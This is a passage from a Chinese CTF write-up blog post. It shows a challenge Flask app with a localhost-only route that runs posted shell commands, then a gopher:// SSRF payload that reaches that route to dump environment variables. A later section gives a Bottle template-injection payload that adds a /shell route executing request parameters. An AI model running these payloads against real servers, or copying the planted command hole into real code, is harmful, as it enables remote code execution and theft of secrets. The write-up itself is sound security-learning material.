        users<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'password'</span><span class="token punctuation">:</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
        <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"Registration successful!"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""
        &lt;!DOCTYPE html&gt;
        &lt;html lang="en"&gt;
        &lt;head&gt;
            &lt;meta charset="UTF-8"&gt;
            &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
            &lt;title&gt;Register&lt;/title&gt;
            &lt;link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"&gt;
            &lt;style&gt;
                body {
                    background-color: #f8f9fa;
                }
                .container {
                    max-width: 400px;
                    margin-top: 100px;
                }
                .card {
                    border: none;
                    border-radius: 10px;
                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                }
                .card-header {
                    background-color: #28a745;
                    color: white;
                    text-align: center;
                    border-radius: 10px 10px 0 0;
                }
                .btn-success {
                    background-color: #28a745;
                    border: none;
                }
                .btn-success:hover {
                    background-color: #218838;
                }
            &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
            &lt;div class="container"&gt;
                &lt;div class="card"&gt;
                    &lt;div class="card-header"&gt;
                        &lt;h3&gt;Register&lt;/h3&gt;
                    &lt;/div&gt;
                    &lt;div class="card-body"&gt;
                        &lt;form method="POST"&gt;
                            &lt;div class="mb-3"&gt;
                                &lt;label for="username" class="form-label"&gt;Username&lt;/label&gt;
                                &lt;input type="text" class="form-control" id="username" name="username" required&gt;
                            &lt;/div&gt;
                            &lt;div class="mb-3"&gt;
                                &lt;label for="password" class="form-label"&gt;Password&lt;/label&gt;
                                &lt;input type="password" class="form-control" id="password" name="password" required&gt;
                            &lt;/div&gt;
                            &lt;button type="submit" class="btn btn-success w-100"&gt;Register&lt;/button&gt;
                        &lt;/form&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/body&gt;
        &lt;/html&gt;
    """</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Manage'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>remote_addr <span class="token operator">!=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Forbidden!!!"</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Allowed!!!"</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">upload_avatar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    junk_code<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> username <span class="token keyword">not</span> <span class="token keyword">in</span> users<span class="token punctuation">:</span>
            <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"User not found!"</span><span class="token punctuation">)</span>
        <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'avatar'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
            <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>avatar_dir<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">.png"</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"Avatar uploaded successfully!"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> b64e<span class="token punctuation">(</span><span class="token string">"No file uploaded!"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token triple-quoted-string string">"""
        &lt;!DOCTYPE html&gt;
        &lt;html lang="en"&gt;
        &lt;head&gt;
            &lt;meta charset="UTF-8"&gt;
            &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
            &lt;title&gt;Upload Avatar&lt;/title&gt;
            &lt;link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"&gt;
            &lt;style&gt;
                body {
                    background-color: #f8f9fa;
                }
                .container {
                    max-width: 400px;
                    margin-top: 100px;
                }
                .card {
                    border: none;
                    border-radius: 10px;
                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
                }
                .card-header {
                    background-color: #dc3545;
                    color: white;
                    text-align: center;
                    border-radius: 10px 10px 0 0;
                }
                .btn-danger {
                    background-color: #dc3545;
                    border: none;
                }
                .btn-danger:hover {
                    background-color: #c82333;
                }
            &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
            &lt;div class="container"&gt;
                &lt;div class="card"&gt;
                    &lt;div class="card-header"&gt;
                        &lt;h3&gt;Upload Avatar&lt;/h3&gt;
                    &lt;/div&gt;
                    &lt;div class="card-body"&gt;
                        &lt;form method="POST" enctype="multipart/form-data"&gt;
                            &lt;div class="mb-3"&gt;
                                &lt;label for="username" class="form-label"&gt;Username&lt;/label&gt;
                                &lt;input type="text" class="form-control" id="username" name="username" required&gt;
                            &lt;/div&gt;
                            &lt;div class="mb-3"&gt;
                                &lt;label for="avatar" class="form-label"&gt;Avatar&lt;/label&gt;
                                &lt;input type="file" class="form-control" id="avatar" name="avatar" required&gt;
                            &lt;/div&gt;
                            &lt;button type="submit" class="btn btn-danger w-100"&gt;Upload&lt;/button&gt;
                        &lt;/form&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/body&gt;
        &lt;/html&gt;
    """</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/app.py'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">download_source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/geekbruce/articles/18399689">Python中urllib.parse 里面的 urlparse 方法理解和使用 - AlphaGeek - 博客园</a></p>
<p>重定向和绕过都不行，有个urlparse,还需要是8000端口</p>
<p>内层Gopher协议+外层GET请求共两次编码，但要注意：</p>
<blockquote>
<p>需要注意的是，<code>quote()</code> 函数默认只对 ASCII 字符进行编码，对于非 ASCII 字符（如中文），你需要指定 <code>safe=''</code> 和 <code>encoding='utf-8'</code> 参数，以确保所有字符都被正确编码。</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse

<span class="token comment"># 原始 HTTP 请求（换行符为 \n）</span>
raw_request <span class="token operator">=</span> <span class="token triple-quoted-string string">"""POST /Manage HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

cmd=env
"""</span>

<span class="token comment"># 对换行符和特殊字符进行编码</span>
encoded_request <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>raw_request<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%0A'</span><span class="token punctuation">,</span> <span class="token string">'%250A'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%20'</span><span class="token punctuation">,</span> <span class="token string">'%2520'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%3A'</span><span class="token punctuation">,</span> <span class="token string">'%253A'</span><span class="token punctuation">)</span>

<span class="token comment"># 拼接 Gopher URL</span>
gopher_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"gopher://127.0.0.2:8000/_</span><span class="token interpolation"><span class="token punctuation">{</span>encoded_request<span class="token punctuation">}</span></span><span class="token string">"</span></span>
<span class="token keyword">print</span><span class="token punctuation">(</span>gopher_url<span class="token punctuation">)</span>

<span class="token comment">#gopher://127.0.0.2:8000/_POST%2520%2FManage%2520HTTP%2F1.1%250AHost%253A%2520127.0.0.1%253A8000%250AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250AContent-Length%253A%25207%250A%250Acmd%3Denv%250A</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>so,还是用工具吧</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ae20d30bd089551c5b858c4195dba089.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">/</span>Gopher?url<span class="token operator">=</span>gopher<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.2</span><span class="token punctuation">:</span><span class="token number">8000</span><span class="token operator">/</span>_POST<span class="token operator">%</span><span class="token number">2520</span><span class="token operator">%</span>252FManage<span class="token operator">%</span>2520HTTP<span class="token operator">%</span><span class="token number">252</span>
 F1<span class="token punctuation">.</span><span class="token number">1</span><span class="token operator">%</span>250Ahost<span class="token operator">%</span>253A127<span class="token punctuation">.</span><span class="token number">0.0</span><span class="token number">.1</span><span class="token operator">%</span>250AContent<span class="token operator">-</span>Type<span class="token operator">%</span>253Aapplication<span class="token operator">%</span>252Fx<span class="token operator">-</span>www<span class="token operator">-</span><span class="token keyword">for</span>
 m<span class="token operator">-</span>urlencoded<span class="token operator">%</span>250AContent<span class="token operator">-</span>Length<span class="token operator">%</span>253A7<span class="token operator">%</span>250A<span class="token operator">%</span>250Acmd<span class="token operator">%</span>253Denv
 
 <span class="token operator">/</span>Gopher?url<span class="token operator">=</span>gopher<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">:</span><span class="token number">8000</span><span class="token operator">/</span>_POST<span class="token operator">%</span><span class="token number">2520</span><span class="token operator">%</span>252FManage<span class="token operator">%</span>2520HTTP<span class="token operator">%</span><span class="token number">252</span>
 F1<span class="token punctuation">.</span><span class="token number">1</span><span class="token operator">%</span>250Ahost<span class="token operator">%</span>253A127<span class="token punctuation">.</span><span class="token number">0.0</span><span class="token number">.1</span><span class="token operator">%</span>250AContent<span class="token operator">-</span>Type<span class="token operator">%</span>253Aapplication<span class="token operator">%</span>252Fx<span class="token operator">-</span>www<span class="token operator">-</span><span class="token keyword">for</span>
 m<span class="token operator">-</span>urlencoded<span class="token operator">%</span>250AContent<span class="token operator">-</span>Length<span class="token operator">%</span>253A7<span class="token operator">%</span>250A<span class="token operator">%</span>250Acmd<span class="token operator">%</span>253Denv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wan212000/article/details/128830035">127.0.0.1 与 127.0.0.2 这两个 IP 地址的区别-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2201_76032266/article/details/142872238">0.0.0.0详解_0.0.0.0是什么ip地址-CSDN博客</a></p>
<hr>
<h3 id="Message-in-a-Bottle-plus"><a href="#Message-in-a-Bottle-plus" class="headerlink" title="Message in a Bottle plus"></a>Message in a Bottle plus</h3><blockquote>
<p>在python⾥%print这本身就是⼀个错误的语法，为了让他可以通过语法检测 然⽽语法检测这种东⻄肯定针对的是代码，那么我们将他变成字符串就可以了，⽤引号包裹就可以绕过ast的检测 </p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''
% from bottle import Bottle, request
% app=__import__('sys').modules['__main__'].__dict__['app']
% app.route("/shell","GET",lambda :__import__('os').popen(request.params.get('lalala')).read())
'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>建议用burp发</p>
<hr>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">q1n9</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://example.com/2025/03/23/uploadssti/">http://example.com/2025/03/23/uploadssti/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">q1n9</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/ctf/">
                                    <span class="chip bg-color">ctf</span>
                                </a>
                            
                                <a href="/tags/wp/">
                                    <span class="chip bg-color">wp</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2025/03/30/untitled/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="nss#round28">
                        
                        <span class="card-title">nss#round28</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2025-03-30
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
                                    网安
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/ctf/">
                        <span class="chip bg-color">ctf</span>
                    </a>
                    
                    <a href="/tags/wp/">
                        <span class="chip bg-color">wp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2025/02/25/qqqqq-000380-week1-wp/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="hgame">
                        
                        <span class="card-title">hgame</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2025-02-25
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
                                    网安
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/ctf/">
                        <span class="chip bg-color">ctf</span>
                    </a>
                    
                    <a href="/tags/wp/">
                        <span class="chip bg-color">wp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>


  <!-- 是否加载使用自带的 prismjs. -->
  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>


<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>



    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="/libs/aplayer/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2025</span>
            
            <a href="/about" target="_blank">q1n9</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            
            <br>
            
                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                        class="white-color">113.1k</span>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/lingqing777" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1625684832@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1625684832" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1625684832" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
